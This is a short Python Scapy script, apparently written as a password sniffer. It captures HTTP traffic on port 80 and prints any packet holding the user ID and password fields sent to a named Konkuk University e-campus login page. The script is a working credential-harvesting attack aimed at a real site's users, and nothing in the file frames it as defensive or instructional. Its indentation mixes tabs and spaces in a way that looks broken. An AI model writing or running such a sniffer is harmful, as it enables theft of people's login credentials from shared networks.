
from scapy.all import*  
  
def showPacket(packet):
	global i  
    	data = '%s' %(packet[TCP].payload)
    	if 'usr_id' in data.lower() and 'usr_pwd' in data.lower() and 'http://ecampus.konkuk.ac.kr/ilos/main/member/login_form.acl' in data.lower():
        	print '%d @@@@@ [%s] @@@@@:\n %s\n' %(i, packet[IP].dst, data)
		i+=1
  
def sniffing(filter):  
    sniff(filter = filter, prn = showPacket, count = 0, store = 0)  
  
if __name__ == '__main__':
	global i
	i = 1 
    	filter = 'tcp port 80'  
    	sniffing(filter)  
